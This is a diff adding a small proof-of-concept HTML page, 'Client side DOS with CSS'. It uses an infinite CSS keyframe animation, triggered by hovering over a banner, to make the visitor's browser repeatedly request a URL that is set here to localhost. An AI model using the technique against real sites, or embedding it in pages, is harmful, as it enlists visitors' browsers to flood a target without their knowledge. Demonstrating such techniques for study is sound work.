@@ -1,0 +1,47 @@
+<meta charset="utf-8">
+<title>Client side DOS with CSS</title>
+
+<style>
+    /* Design */
+    body {
+        background: black;
+    }
+    #activator {
+        text-align: center;
+        background: greenyellow;
+    }
+
+    /* Main */
+    @keyframes dos {
+        0% {
+            --site-to-dos: url("http://localhost");
+            content: var(--site-to-dos);
+        }
+    }
+    #activator:hover:after {
+        --seconds-in-day: 86400s;
+
+        animation-name: dos;
+        animation: dos 1s infinite;
+        -webkit-animation: dos 1s infinite;
+        -moz-animation: dos 1s infinite;
+        animation-duration: var(--seconds-in-day);
+        content: '';
+    }
+
+    /* Optional */
+    /* #activator:after {
+        --seconds-in-day: 86400s;
+
+        animation-name: dos;
+        animation: dos 1s infinite;
+        -webkit-animation: dos 1s infinite;
+        -moz-animation: dos 1s infinite;
+        animation-duration: var(--seconds-in-day);
+        content: '';
+    } */
+</style>
+
+<div id="activator">
+    Open network tab in devtools and move your mouse on me :)
+</div>
